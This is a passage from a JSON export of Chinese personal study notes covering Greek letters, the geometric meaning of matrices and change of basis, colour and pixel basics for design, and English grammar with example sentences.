    "body": "# 常用数学符号\n- Α α：阿尔法 Alpha\n- Β β：贝塔 Beta\n- Γ γ：伽玛 Gamma\n- Δ δ：德尔塔 Delte\n- Ε ε：艾普西龙 Epsilon\n- Ζ ζ ：捷塔 Zeta\n- Ε η：依塔 Eta\n- Θ θ：西塔 Theta\n- Ι ι：艾欧塔 Iota\n- Κ κ：喀帕 Kappa\n- ∧ λ：拉姆达 Lambda\n- Μ μ：缪 Mu\n- Ν ν：拗 Nu\n- Ξ ξ：克西 Xi\n- Ο ο：欧麦克轮 Omicron\n- ∏ π：派 Pi\n- Ρ ρ：柔 Rho\n- ∑ σ：西格玛 Sigma\n- Τ τ：套 Tau\n- Υ υ：宇普西龙 Upsilon\n- Φ φ：fai Phi\n- Χ χ：器 Chi\n- Ψ ψ：普赛 Psi\n- Ω ω：欧米伽 Omega\n\n# 空间变换\n**矩阵的乘法的几何意义就是空间变换。**\n\n$Ma=b$ 代表 经过 $a$ 的变换后变成了 $b$ 。考虑原空间中的所有向量所构成的空间 $A$ ，那么 $MA=B$ ，也就是空间 $A$ 经过 $M$ 的变换变为了空间 $B$ 。描述这种变换的一种浅显易懂的方式就是用“网格”的变换。\n\n如下图，矩阵 $\\begin{bmatrix} 3&1\\\\ 1&2\\\\ \\end{bmatrix}$ 将列向量  $\\begin{bmatrix} -1\\\\ 2\\\\ \\end{bmatrix}$ 变为 $\\begin{bmatrix} 1\\\\ 3\\\\ \\end{bmatrix}$ 。同时，图片显示了矩阵是如何变换空间的。\n\n![](https://gitee.com/NaisWang/images/raw/master/img/376455ae-2341-11eb-8317-9617913ca398.gif)\n\n观察矩阵如何变换空间的一种简单的方法是看，变换矩阵 $M$ 将 $i, j$ 映射为什么。**（这里默认原空间基向量为标准正交基）**。例如上图中变换矩阵 $M$ 将 $i, j$ 映射为 $u, v$ ，因此若在，原坐标系下坐标为 $(x, y)$ ,即 $\\vec a = x\\vec i + y\\vec j$ ，因此映射为 $\\vec b = x\\vec u + y\\vec v$ 。计算的时候表示为：\n$$ M\\vec a = \\begin{bmatrix} 3&1\\\\ 1&2 \\end{bmatrix} \\begin{bmatrix} x \\\\ y \\end{bmatrix} = \\begin{bmatrix} 3x + 1y \\\\ 1x + 2y \\end{bmatrix} = x\\begin{bmatrix} 3 \\\\ 1 \\end{bmatrix} + y\\begin{bmatrix} 1 \\\\ 2 \\end{bmatrix} =  x\\vec u + y\\vec v = \\vec b$$\n因此从上式也可看出，矩阵乘法就是空间变换，是一种映射。\n\n或者按照以下方式来理解：\n$$M\\vec a=\\vec b, \\vec a=\\begin{bmatrix}a\\\\b\\end{bmatrix}, \\vec b=\\begin{bmatrix}c\\\\d\\end{bmatrix}$$\n表示在$M$基下的坐标系中坐标(a, b)形成的向量为$\\vec b$。但注意坐标(a, b)在默认基下形成的坐标系中也对应着一个向量$\\vec a$。由此可以看成在默认基下向量$\\vec a$通过$M$变换转变成了向量$\\vec b$\n\n## 行列式\n行列式 $det(A)$ 给出了由 $A$ 表示的映射引起的缩放因子和方向。数值代表缩放因子，正负号代表变换的方向。当行列式等于1时，由 $A$ 定义的线性变换是等值的和保持方向的。\n\n如下图：在二维空间中，行列式代表面积，行列式的值越大，代表变换对面积造成的影响越大。行列式若为负值代表空间发生了翻转。\n\n![](https://gitee.com/NaisWang/images/raw/master/img/20211118104823.png)\n\n如果一个n阶方阵的行列式为0，也就证明这个行列式不满秩。也就是说组成行列式的列向量是线性相关的，那么这n个列向量张成的空间便是n维空间的一个投影，维度等于秩。\n\n$det(A) = 0$ ,变换 $A$ 使得空间的维度被压缩了，例如2维空间被压缩为1维空间，如下图。\n\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-d443054c5dfd3fba157834b5af9814e1_b.webp-2.gif)\n\n## 非方阵\n非方阵没有行列式。按照空间变化，非方阵一定使得空间的维度发生了变化，无法衡量变换的大小，因此没有行列式。\n\n例如一个3*2的矩阵可以将一个二维平面的向量映射为三维空间中的一个平面上的向量。而一个2*3的矩阵可以将一个三维空间的向量映射为二维平面上的一个向量，考虑整个三维空间就是将原空间做了一个投影。\n\n## 列空间与秩\n- 列空间：矩阵的列向量所张成的空间\n- 秩：列空间的维数\n- 满秩：列空间的维数与列数相等\n\n## 矩阵的逆\n矩阵不一定存在逆。可以求逆的矩阵叫做可逆矩阵，也叫非奇异矩阵。矩阵为非奇异矩阵的充要条件是矩阵存在行列式且不为0。\n\n可以这样理解：矩阵的作用是空间变换，其实就类似于一个函数。（这里说映射更标准些）矩阵求逆就类似于求反函数。当矩阵为不存在行列式或者行列式为0时，代表变换发生了降维，其映射关系不是一对一的关系，是多对一的关系，因此无法求逆或没有意义。例如上面那张图所代表的变换把空间变为一条直线，但是从直线生成一个平面却有无数种方法。\n\n$A^{-1}$ 所代表的变换恰好是 $A$ 变换的逆过程。下图很好的说明了这一点。\n\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-0f58c0aeb812754eccefa8fa7bdbe336_b.webp.gif)\n\n求解$Ax = b$ 的几何意义，就是找到一个向量x使得在A的变换下，x被映射为b。如果A为满秩矩阵，则有唯一解 $x = A^{-1}b$ ，也就是对b施加逆变换即可找到x。\n\n# 基变换\n<font color=\"red\">首先要有一个概念，我们用坐标来描述向量，那么首先要选取坐标系（类似于做物理题先选取参考系），而坐标系就是基向量的体现。因此我们对于向量、变换的描述都要说清楚是在什么基向量下进行的，同一个向量或者变换在不同的基向量下坐标不一定相同。</font>\n\n## 不同基下的向量变换\n例如，对于 $M\\vec a = \\vec b$, 其中$\\vec a = \\begin{bmatrix} a_{1} \\\\ a_{2}\\end{bmatrix}$，表示在矩阵$M$的列向量组成的基下的坐标系中坐标为$(a_{1}, a_{2})$的向量为$\\vec b$。但注意在默认的基下也坐标$(a_{1}, a_{2})$对应的向量为$\\vec a$。由此可以将$M\\vec a = \\vec b$看成在默认基下将向量$\\vec a$通过$M$转出成向量$\\vec b$\n\n如下图，从原点出发到黑点的向量可以用红色和绿色的基向量表示。在绿色基向量表示下，此向量为 $(4, 3)$ ；在红色基向量表示下，此向量为 $(2, 1)$。\n\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-74c896f8b0832617b6366c05e582fdc4_b.webp.gif)\n\n这两个坐标如何转换呢？绿色的基向量为 $i, j$ ,红色的基向量为 $u, v$ 。\n\n若选择 $i, j$ 为基向量，则 $u=\\begin{bmatrix} 3\\\\1 \\end{bmatrix}, v=\\begin{bmatrix} -2 \\\\ 1 \\end{bmatrix}$ ，那么在红色基向量下的坐标可以如下转化为在绿色基向量表达下的坐标。\n$$ 2\\begin{bmatrix} 3\\\\1 \\end{bmatrix} + 1\\begin{bmatrix} -2 \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} 3&-2\\\\ 1&1 \\end{bmatrix} \\begin{bmatrix} 2 \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} 4 \\\\ 3 \\end{bmatrix} 。( P =  \\begin{bmatrix} 3&-2\\\\ 1&1 \\end{bmatrix} )$$\n\n\n若选择 $u, v$ 为基向量，则 $i=\\begin{bmatrix} 1/5\\\\-1/5 \\end{bmatrix}, j=\\begin{bmatrix} 2/5 \\\\ 3/5 \\end{bmatrix} $ ，那么在绿色基向量下的坐标可以如下转化为在红色基向量表达下的坐标。\n$$ 4\\begin{bmatrix} 1/5\\\\-1/5 \\end{bmatrix} + 3\\begin{bmatrix} 2/5 \\\\ 3/5 \\end{bmatrix} = \\begin{bmatrix} 1/5&2/5\\\\ -1/5&3/5 \\end{bmatrix} \\begin{bmatrix} 4 \\\\ 3 \\end{bmatrix} = \\begin{bmatrix} 2 \\\\ 1 \\end{bmatrix} 。( Q =  \\begin{bmatrix} 1/5&2/5\\\\ -1/5&3/5 \\end{bmatrix} )$$\n\n其实 P,Q互逆，即$P = Q^{-1}$ 。\n\n## 不同基下的空间变换\n同一个变换在不同的基下也是不同的，例如有一个变换是逆时针旋转90°。即将上图空间变为下图：\n"
  },
  {
    "title": "./notes/基础知识/设计.md",
    "body": "# 色轮\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120141014.png)\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120142014.png)\n## 对比色\n在色环图中，相对成180度，也就是直线两端的颜色，互为补色。 100度~179度称为对比色。\n## 类似色\n在色环图中，相邻的两色即为类似色。\n## 暖色与冷色\n在色环中，以绿和紫色两个中性色为界，红、橙、黄等为暖色，绿、青、蓝等为冷色。\n\n\n# HSB\nHSB又称HSV，表示一种颜色模式：在HSB模式中，H(hues)表示色相，S(saturation)表示饱和度，B（brightness）表示亮度HSB模式对应的媒介是人眼。\n- 色相（H,hue）：在0~360°的标准色轮上，色相是按位置度量的。在通常的使用中，色相是由颜色名称标识的，比如红、绿或橙色。黑色和白色无色相。\n- 饱和度（S,saturation）：表示色彩的纯度，为0时为灰色。白、黑和其他灰色色彩都没有饱和度的\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120141720.png)\n- 亮度（B,brightness或V,value）：是色彩的明亮度。为0时即为黑色。最大亮度是色彩最鲜明的状态\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120141757.png)\n\n# 搭配方式\n## 单色搭配\n### 一种有彩色 + 一种无彩色\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120142125.png)\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120142138.png)\n\n### 只有无彩色\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120142229.png)\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120142245.png)\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120142259.png)\n\n## 同色系搭配\n选择一种颜色，用它的渐变色搭配，注意要拉大色差\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120142503.png)\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120142521.png)\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120142533.png)\n\n## 撞色搭配\n通常不建议在日常中使用大面积的撞色搭配，除非你那天是在一个颜色很丰富，包容性很强的场合里，比如万圣节。\n### 撞色搭配技巧一：使用小面积撞色\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120143023.png)\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120143037.png)\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120143055.png)\n\n### 撞色搭配技巧二：降低撞色饱和度\n![](https://gitee.com/NaisWang/images/raw/master/img/20211120143241.png)\n\n\n# 像素与分辨率\n## 像素\n像素的分类：数码像素与屏幕像素（或者叫物理像素，有实实在在的物理尺寸）\n\n### 屏幕像素\n屏幕像素是指显示屏的像素，包括电视机，电脑显示屏，手机显示屏等等，这些像素不是虚拟的，是实实在在存在的，具有物理尺寸大小，通常是英寸-inch, 这些像素通常来说只有一种比列1：1的正方形，并且像素点之间是紧挨着的。但是我们经常会看到户外显示屏的像素点，通常人们叫LED屏幕，这些屏幕的像素点就有不同比例的，还有圆形的，因为人们观看广告的距离不是近距离，而是几十米上百米远，所以他们的像素点并不是一颗紧挨着另一颗，像素点之间有空隙和距离。如下图，黑色缝隙挺大的。\n![](https://gitee.com/NaisWang/images/raw/master/img/20211206155910.png)\n\n### 数码像素\n数码像素是一种虚拟化的数字，大小可以任意，或者说没有实际的物理尺寸大小。一个png图片是一堆二进制代码，表达了该png图片存储了多少了像素，每个像素具体的信息。\n\n由于数码像素是没有实际的物理尺寸大小，所以我们常说的ppi（pixels per inch）指得是每一寸中屏幕像素的个数，而不是数码像素的个数\n\n### 数码像素与屏幕像素之间的关系\n数码像素终究是一串二进制代码，它依赖于屏幕像素来展示出来。一个数码像素**至少**占一个屏幕像素，不会出现一个屏幕像素表达了多个数码像素的情况。\n\n**图片放大情况**\n在屏幕上将图片放大后，会变得模糊，会很明显的看出数码像素表达出来的信息，因为图片放大后，一个数码像素会占据多个屏幕像素。\n![](https://gitee.com/NaisWang/images/raw/master/img/Screen2021-12-06.jpg)\n\n**图片缩小情况**\n在屏幕上将图片缩小后，注意一个数码像素是至少占一个屏幕像素的，所以不会出现一个屏幕像素表达了多个数码像素的情况。缩小图片是由软件通过算法按照缩小比例暂时减少了数码像素或减少一个数码像素所占的屏幕像素个数，所以图片从视觉上看上去变小了。\n\n## 分辨率\n分辨率的分类：数码分辨率与屏幕分辨率（或者叫物理分辨率）"
  },
  {
    "title": "./notes/基础知识/英语.md",
    "body": "# 词性\n英语十大词性:\n1. 动词\n2. 名词\n3. 冠词\n4. 代词: 替代人或物，例如：I am a rabbit.中的I是代词\n5. 形容词\n6. 数词: 例如：I ate two carrots. 中的two为数词\n7. 副词\n8. 介词: 表示和其他词关系的词，例如：I ate two carrots with chopsticks. 中的with为介词\n9. 叹词: 表感叹，例如：Ah, the carrot is tasty! 中的Ah为叹词\n10. 连词：连接词和句，例如：I ate two carrots and potato, because I was hungry. 中because为连接\n\n## 冠词\n从语法上讲，冠词是虚词的一种，它只能搭配名词使用，说明该名词的意义。英语中的冠词可以分为：定冠词（the），不定冠词（a或者an）和零冠词。对于冠词使用，最核心的地方有两点：\n1. 判断和冠词搭配使用的名词是可数名词还是不可数名词\n2. 判断冠词在语境中是特指还是泛指\n\n先说第一点，关于可数名词和不可数名词的判断。汉语中并没有可数名词和不可数名词的概念，这给我们判断单词是否可数带来了很大困难。比如“家具”（furniture），这个概念在汉语中是可数的，但在英语中它不可数。又比如“发展”（development），按照汉语思维习惯，它应该是不可数名词，但它实际上可以作为可数名词使用（例如：There have been significant computer developments during the last decade.）\n\n要判断一个单词是否可数不能靠直觉，只能多查词典，参考词典的解释和例句。词典查多了我们对常用词的单复数判断会越来越准确。\n\n区分冠词的特指和泛指。泛指是指一类事物，或某类事物的总称。特指是指某类事物中的具体的某一个或某一些。\n\n如下图所示，只有两种情况下，才表示特指：\n\n![](https://gitee.com/NaisWang/images/raw/master/img/20211208144847.png)\n\n## 动词\n### 时态\n英语的时态，就是英语动词的时态，是动词的时间和动词的状态连在一起，合称“时态”\n\n动词的时间有如下4种：\n- 现在\n- 过去\n- 将来\n- 过去将来\n\n动词的状态有如下4种：\n- 一般\n- 完成\n- 进行\n- 完成进行\n\n所以动词的时间与动词的状态自由排列组合便是理论上的16种时态\n\n\n### 使役动词\n使役動詞屬於「動詞」的一種，用於「命令他人」、「指示他人動作」。\n\n以下為常見的四個使役動詞：\n- make：強迫某人做事\n- have：交付某人任務，叫某人做事\n- let：讓某人做事\n- get：說服某人做事、叫某人做事\n\n```\nI made my sister clean her room.\n我強迫我姐姐整理她的房間。\n\nMy teacher let me sing a song in front of the class.\n老師讓我在全班面前唱一首歌。\n\nThe customer got the clerk to wrap up the present for him.\n客人叫店員幫他包裝禮物。\n\nWe have our office cleaned every weekend.\n我們安排辦公室每週末都被打掃。\n\nHow could you let your mother be insulted like that?\n你怎能讓你媽媽如此受辱？\n\nThe accident got Kevin fired.\n這場意外讓 Kevin 被炒魷魚。\n```\n\n### 非谓语动词\n**非谓语动词几乎可以充当任何成分，也取代所有的从句，从而简化句子。只不过这样的动词就不再具有表示动作时间、状态、语气的功能**\n\n#### 动词不定式\n##### 作主语\n动词不定式作主语时，句子的谓语动词常用单数，其位置有以下两种：\n(1)把不定式置于句首。如：\n```\nTo get there by bike will take us half an hour.\nTo make up for lost time is not possible.\nTo lean out of the window is dangerous.\nTo save money now seems impossible.\n```\n(2)用it作形式主语，把真正的主语不定式置于句后，常用于下列句式中。如：\n```\nIt's our duty to take good care of the old.\nIt is difficult for us to finish writing the composition in a quarter of an hour.\nIt seemed impossible to save money.\nHe thought it would be safer to go by train.\n```\n\n##### 作宾语\n以下动词后，只能跟不定式作宾语\nafford （付得起），agree（同意），aim(力求做到)，appear（显得），arrange（安排），ask（要求），attempt （试图），care（想要），choose（决定），claim（声称），condescend（屈尊），consent（准许），decide（决定），demand（要求），determine（决心），endeavor（竭力），expect（期待），fail（未履行），help（帮助），hesitate（犹豫），hope（希望），learn（学会），manage（设法），neglect（疏忽），offer（主动提出），plan（计划），prepare（准备），pretend（假装），proceed（接着做），promise（答应），prove（证明），refuse（拒绝），resolve（解决），seem（觉得好像），swear（发誓），tend（往往会），threaten（预示），undertake（承诺），volunteer（自愿做），vow（发誓），want（想要），wish（希望）\n\n```\nThe driver failed to see the other car in time.\nI happen to know the answer to your question.\n```\n\n##### 作补语\n```\nFather will not allow us to play on the street.\nWe believe him to be guilty.\nWe consider Tom to be one of the best students in our class.\nThe book is believed to be uninteresting.\n```\n\n##### 作表语\n```\nMy chief purpose is to point out the difficulties of the matter.\nWhat I would suggest is to put off the meeting.\n```\n\n##### 作状语\n```\nI come here only to say good-bye to you.　\nHe searched the room only to find nothing.\nI'm glad to see you.\n```\n\n##### 作定语\n```\nThe next train to arrive is from Washington.\nDo you have anything to be taken to your sister?\nDo you have anything to say on the question?\nMy wish to visit France has come true at last.\n```\n\n# 句子\n## 认识简单句\n句中的主语和谓语动词只有一个时, 无论长短都属于简单句。\n\n### 句子六大成分\n英语的句子成分主要包括7类：\n- 主语subject\n- 谓语predicate\n- 宾语object\n- 定语attributive\n- 状语adverbial\n- (宾语/主语)补语complement\n- 同位语Appositive\n其中主谓宾是句子的主干，其余成分都是围绕主谓宾进行修饰或描述的\n\n尽管句子成分与词性有一定的对应关系，但二者却属于两个概念。\n- 词性：是指词汇的属性，是某个单词固有特征，同一个单词可以有不同的词性\n- 句子成分：是指词汇在句中所起的功能与作用，是由词汇之间相互关系决定的\n比如stone石头这个单词，一般情况下stone用作名词，我们看下面两个例子:\n```\nThis stone is precious. 其中stone为名词，充当主语成分\nI love this stone. 其中stone为名词, 充当宾语成分\n```\n另外句子成分是一个集合概念，不是和单词一一对应的，比如`a beautiful dress was lost.` 这句话的主语部分由三个单词Her beautiful dress组成， 其中dress是名词，是主语部分的中心词；beautiful是形容词，用作dress的定语；Her是物主代词，用来限定dress\n\n接下里我们看一下六类句子的成分的属性以及和词性的对应关系。\n\n> 注：你可能听说过“插入语”，如This carrot, I think(插入语), is very tasty. 但是插入语是独立的，不作句子成分\n\n#### 主语\n主语是句子发出的主体对象，是句子所要描述的人或物，一般由名词、代词、或名词化的其他词汇或短语构成。如下例子：\n```\nThe milkman arrived late. 主语为The milkman\nPractising is important. 主语为Practising\n```\n\n#### 谓语\n谓语是说明主语所处的状态或所做的动作，用于主语之后，由动词构成。如下例子：\n```\nVivi played badminton well. 动词为played\nIt is perfect. 动词为is\n```\n\n#### 宾语\n宾语是动词的承受对象，用于动词之后，一般由名词、代词、或名词化的其他词汇或短语构成。如下例子：\n```\nShe has had the cake. 宾语为the cake\nI enjoyed her singing yesterday. 宾语为singing\n\nI teach you English. 间接宾语为you, 直接宾语为English\n```\n\n#### 定语\n定语是用来修饰或描述主语或宾语的，一般由形容词或其他有修饰作用的短语构成。\n- 如果定语是单个词汇，则位于被修饰语的前面\n- 如果定语时词组，则位于被修饰语的后面\n```\nThe tired dog lay on the ground. 其中定语为tried，用来修饰dog\nI have a lot of work to do. 其中定语为to do，用来修饰work\n```\n\n#### 状语\n状语表示动作发生的时间、地点、原因、目的、结果、方式、程度等等，一般副词或相当于副词的短语构成。如下例子：\n```\nSally went to New York by plane to visit her friend last weekend. 其中by plane做方式状语，to visit her friend作目的状语，last weekend作时间状语\n```\n\n#### 补语\n补语是用来补充说明主语或宾语的相关信息，分为主语补足语和宾语补足语。\n\n##### 宾语补足语\n宾语补足语是跟在宾语之后对宾语进行补充说明。如`we voted Mike chairman`，我们选Mike干什么呢？宾补chairman补充说明选他做主席。如果把这样的句子变为被动句，之前的宾语补足语就变成了主语补足语。如`Mike was voted chairman`。\n\n##### 主语补足语/系表结构\n另外有些学者把系表结构也算做主语补足语的一种形式。主语补足语或表语的使用要求跟在系动词之后。常见的系动词有：be, become, turn, get, grow, appear, seem, keep, remain, taste, feel, look, sound.\n\n另外判断句子是否是主补结构或系表结构时，如可以把句中动词换成be动词而意思不变，那么该句子就是主补结构或系表结构。如下：\n```\nHe keeps quiet. ==> He is quiet. 是主补结构或系表结构\nHe keeps the ball. !=> He is ball. 不是主补结构或系表结构\nYou grow bigger. ==> You are bigger. 是主补结构或系表结构 \nYou grow rice. !=> You are rice. 不是主补结构或系表结构\n```\n\n#### 同位语\n一个名词(或其它形式)对另一个名词或代词进行解释或补充说明，这个名词（或其它形式）就是同位语。\n\n```\nMr. Smith,our new teacher,is very kind to us.\n我们的新老师史密斯先生对我们很好。\n```\n\n### 句子基本构成\n英语句子最基本的结构是一个主语和一个谓语动词构成。常见的有如下5种简单句构成方式：\n- 主语 + 不及物动词, 例如：The birds fly.\n- 主语 + 及物动词 + 宾语, 例如：We clean the classroom\n- 主语 + 双及物动词 + 间接宾语 + 直接宾语, 例如：I teach you English.\n- 主语 + 复杂及物动词 + 宾语 + (宾语)补语, 例如：I consider you smart.\n- 主语 + 系动词 + (主语)补语/表语，例如: The food tastes delicious.\n\n> 注：还有一种“八大句型”的分类，即在“五大句型”基础上增加：\n> \"there be\" 句型，如There is a rabbit. 可理解为第五种句型“主语 + 系动词 + 表语”的倒装\n> 主语 + 谓语动词 + 状语，如： I live in China. 可理解为第一种句型“主语 + 谓语动词”的延伸\n> 主语 + 谓语动词 + 宾语 + 状语， 如：I put the carrot on the table. 可理解为第四种句型\"主语 + 谓语动词 + 宾语 + 宾语补语\"的延伸\n\n> 区分主谓宾宾结构与主谓宾补结构的方法：在宾语后加上be 动词，如果能构成完整句子则是宾语补足语，反之就是双宾语，大家来看一组句子：`I made John our chairman.`与`I made John a cake.`。依据我们刚才说的方法，在宾语后加上be 动词，第一句话就是John is our chairman（约翰是我们的主席），这句话完全可以说的通，所以第一句话就是宾语补足语。现在我们再来看第二句话，再在在宾语后加上be 动词，也就是John is a cake （约翰是一个蛋糕），此时这句话不符合逻辑和事实，所以第二句话I made John a cake 就是双宾语结构句式。\n\n英语的长句都是在这5个基本的简单句式基础上增加句子成分扩展而来。如下：\n```\nThe girl draws.\n    | | \n    | | 加一个draw的宾语\n    \\/\nThe girl draws a rainbow.\n    | | \n    | | 加一个draw的方式\n    \\/\nThe girl carefully draws a rainbow.\n    | | \n    | | 加一个地点\n    \\/\nThe girl carefully draws a rainbow in the study.\n    | | \n    | | 加定语\n    \\/\nThe lovely girl carefully draws a beautiful rainbow in the study.\n```\n\n## 并列句\n并列句是通过并列连词将两个或两个以上的简单句连成一个完整的句子。并列句中各小句的语义平等平行并存，这与复合句中主句和从句的从属关系有所不同。\n\n### 7个并列连词\n英语中只有7个并列连词，这7个并列连词的首字母组成一个单词`FANBOYS`, 如下：\n- F: for\n- A: and\n- N: nor\n- B: but\n- O: or\n- y: yet\n- s: so\n根据7个单词的语义可以分为4类连词\n\n### 4类并列连词\n#### 表示顺接关系的and和nor\nand连接两个肯定的句子。nor连接两个否定的句子。如下：\n```\nEvery morning Susan gets up early and reads aloud in the garden.\nI study in China, and my sister studies in Australia.\n\nKate will not visit grandpa, nor will Helen.\n```\n> 注意：英语语法规则中，否定词放到句首时，主语和谓语需要倒装，所以会出现上述例子中nor will Helen这样的结构\n\n#### 表示转折关系的but和yet\nbut和yet用作并列连词时都有转折的含义，语言上差别不大。yet更突出一些出乎意料的含义，如下例子：\n```\nHe likes basketball, yet he cannot play is well.\nHe likes basketball, but he does not like tennis.\n```\n\n#### 表示因果关系的for和so\nfor引出的是原因。so引出的是结果。如下：\n```\nI came to Shanghai International Studies University, for I wanted to study English well.\n\nI wanted to study English well, so I came to Shanghai Internaltional Studies University.\n```\n\n#### 表示选择关系或条件关系的or\nor表示选择关系时，翻译为或者；or表示条件关系时，翻译为否则\n```\nWe can have dinner out, or we can see a film. 这里or表示选择关系\n\nYou should spend more time on chemistry, or you will fail the test. 这里的or表示条件关系\n```\n\n## 复合句\n复合句也就是我们常说的各类从句，每个从句要求至少有一个独立的主句，一个从属小句，还有一个不能缺少的连词。从句不能单独使用，需要与主句同时使用。\n\n英语可以分为三大类复合句，如下：\n- 名词性从句 : 主语从句、宾语从句、表语从句、同位语从句\n- 形容词性从句 : 定语从句\n- 副词性从句 : 状语从句\n\n### 名词性从句\n名词性从句(Noun clause)是在句子中起名词作用的句子。 名词性从句的功能相当于名词词组， 它在复合句中能担任主语、宾语、表语、同位语、介词宾语等，因此根据它在句中不同的语法功能，名词性从句又可分别称为主语从句、宾语从句、表语从句和同位语从句。\n\n#### 连接词\n连接词可分为：\n- (1)连词 e.g.:that,whether,if,as if , as though \n- (2)连接代词 e.g.:what/whatever, who/whoever, whom/whomever, whose， which/whichever\n- (3)连接副词 e.g.:when/whenever, where/wherever, how/however, why,because\n\n连接词既起着联系从句与主句的作用,其中连词在从句中不担任语法成分，连接代词与连接副词在从句中担任一定的语法成分。 连接代词主要作主语，宾语，表语，定语等，连接副词在从句中作状语。\n\n#### 连词引导名词性从句\n##### 引导主语从句\n```\nWhether he can come to the party on time depends on the traffic.\n```\n有时为避免句子头重脚轻，常用形式主语it代替主语从句作形式主语放于句首，而把主语从句置于句末。\n```\nIt's a great pity that they didn't get married.\nIt's splendid that you passed your exam.\n```\n\n##### 引导宾语从句\n```\nHe has told me that he will go to Shanghai tomorrow. \n``\nI think it necessary that we take plenty of hot water every day.\n```\n\n##### 引导表语从句\n```\nThe question is whether we can get in touch with her.\nThe fact is that we have lost the game. \n```\n\n##### 引导同位语从句\n```\nThe news that we won the game is exciting.\n```\n\n#### 连接代词引导名词性从句\n##### 引导主语从句\n```\nWhat he wants to tell us is not clear.\nWho will win the match is still unknown.\n```\n\n##### 引导宾语从句\n```\nI want to know what he has told you.\nShe will give whoever needs help a warm support. \n```\n\n##### 引导表语从句\n```\nThat’s just what I want. \nIt looks as if it is going to rain. \n```\n\n#### 连接副词引导名词性从句\n##### 引导主语从句\n```\nWhere the English evening will be held has not yet been announced.\n```\n有时为避免句子头重脚轻，常用形式主语it代替主语从句作形式主语放于句首，而把主语从句置于句末。\n```\nIt is known to us how he became a writer. \n```\n\n##### 引导宾语从句\n```\nShe always thinks of how she can work well. \n```\n\n##### 引导表语从句\n```\nThis is where our problem lies.\nThat is why he didn’t come to the meeting.\n```\n\n### 形容词性从句（定语从句）\n#### 什么是定语从句\n定义：在一个复合句中，跟在主句后修饰某一名词或代词（统称为先行词）的从句叫做定语从句(The Attributive Clause).被定语从句所修饰的词叫做**先行词**(Antecedent).定语从句通常跟在先行词之后,由**关系词**(Relatives)引出.因此,定语从句又可称为关系分句. 定语从句有限制性和非限制性两种。限制性定语从句是先行词不可缺少的部分，去掉它主句意思往往不明确；非限制性定语从句是先行词的附加说明，去掉了也不会影响主句的意思，它与主句之间通常用逗号分开，将非限定性定语从句放在句子中间，其前后都需要用逗号隔开\n\n#### 关系词\n关系词可分为：\n- (1)关系代词 e.g.:that,which,who,whom,whose etc.\n- (2)关系副词 e.g.:when,where,why etc.\n\n关系词既起着联系从句与主句的作用,**又代替先行词在从句中担任一定的语法成分**.如主句,宾语,定语,状语等.\n\ne.g.:\n```\n  The woman who is standing by the classroom is our Chinese teacher.\n```\n在此句中,the woman是先行词;关系代词who引导定语从句,同时代替先行词在从句中担任主语.\n```\n  This is the room where Bin Ladin once lived.\n```\n在此句中,the room是先行词;关系副词where引导定语从句并在从句中担任地点状语.\n\n#### 关系代词引导定语从句\n##### Who:代替人.\n做主语:\n```\n  The girl who plays the piano very well is his girlfriend.\n```\n做表语:\n```\n  She is no longer the woman who she used to be.\n```\n做宾语:\n```\n  I can't remember the man who I gave the key to.\n```\n\n##### Whom:代替人.\n做动词宾语:\n```\n  Where is the student whom Professor Nirth praised at the meeting.\n```\n做介词宾语:\n```\n  The girl with whom he was traveling is his girlfriend.\n```\n注：在“介词提前”即“介词+关系代词”结构出现时，关系代词只能用 whom 和 which 。\n\n##### Whose(=of whom/Which):\n代替人(做从句中某名词的定语):\n```\n  She is looking after the little child whose parents have gone to Singapore.\n```\n代替物(做从句中某名词的定语):\n```\n  He lived in the room whose windows face south.\n```\n\n##### That:\n###### 代替人:\n做主语:\n```\n  The man that is speaking at the meeting is a famous scientist.\n```\n做宾语:\n```\n  Is this the teacher that you talked about yesterday.\n```\n做表语:\n```\n  She is no longer the girl that she was in her childhood.\n```\n\n###### 代替物:\n做主语:\n```\n  The train that has just left is for Beijing.\n```\n做宾语:\n```\n  Is this the photo that you took last summer?\n```\n做表语:\n```\n  I wish my home town was not a polluted place that you think it to be.\n```\n\n##### Which:代替物.\n做主语:\n```\n  The building which stands near the train station is a company.\n```\n做宾语:\n```\n  The computer which she wanted to buy was sold out.\n```\n做表语:\n```\n  She was fond of dancing,which her husband never was.\n```\n\n#### 关系副词引导宾语从句\n关系副词在意义上常常相当与一个\"prep.+which\"的结构.\n\nWhen(=at,on,in,during + which):代替时间名词.做时间状语:\n```\n  I shall never forget the day when(on which) we moved into our new flat.\n```\nWhere(=in,at + which):代替地点名词.做时间状语:\n```\n  This is the place where(at which) John parks his car.\n```\nWhy(=for which):代替指代原因.做原因状语:\n```\n  She didn't know the reason why(for which) she was dismissed.\n```\n\n#### as引导的定语从句\n##### 引导限定性定语从句.\nas用作关系代词和关系副词引导限定性定语从句,并在从句中做主语,宾语,表语或状语,构成:the...same as, such...as, so...as 等结构.\n\n做主语:\n```\n  Here are such questions as are often asked by the university students.\n```\n做宾语:\n```\n  This is the same T-shirt as I have bought.\n```\n做表语:\n```\n  She has never seen such a handsome boy as I am. \n```\n做方式状语:\n```\n  She'll do the experiment the same way as I do.\n```\n做时间状语:\n```\n  I came the same day as he left.\n```\n做地点状语:\n```\n  She studies in the same college as he does.\n```\n做原因状语:\n```\n  She didn't believe such reason as he did so.\n```\n做结果状语:\n```\n  Here is so difficult a question as nobody can answer.\n```\n\n##### 引导非限定性定语从句\nas引导非限定性定语从句时,代替整个主句,对其进行说明.一般用于as we all know,as is known to all,as it is,as is said above,as already mentioned above,as is usual,as is often the case,as is reported in the 